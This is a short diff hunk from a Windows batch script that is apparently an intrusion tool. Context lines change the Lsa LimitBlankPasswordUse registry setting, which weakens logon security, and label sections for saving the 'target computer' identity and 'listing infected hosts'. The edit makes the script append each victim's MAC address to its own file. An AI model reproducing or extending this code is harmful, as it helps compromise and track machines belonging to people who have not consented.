@@ -24,7 +24,7 @@ reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa" /v LimitBlankP
 
 rem SAVE THE IDENTY OF TARGET COMPUTER
 set /p alias=Enter an alias:
-@FOR /F %%i IN ('getmac /fo table /nh') DO ECHO rem %alias% %%i >> hadm.bat
+@FOR /F %%i IN ('getmac /fo table /nh') DO ECHO rem %alias% %%i >> %0
 
 rem LISTING INFECTED HOSTS
 rem ----------------------
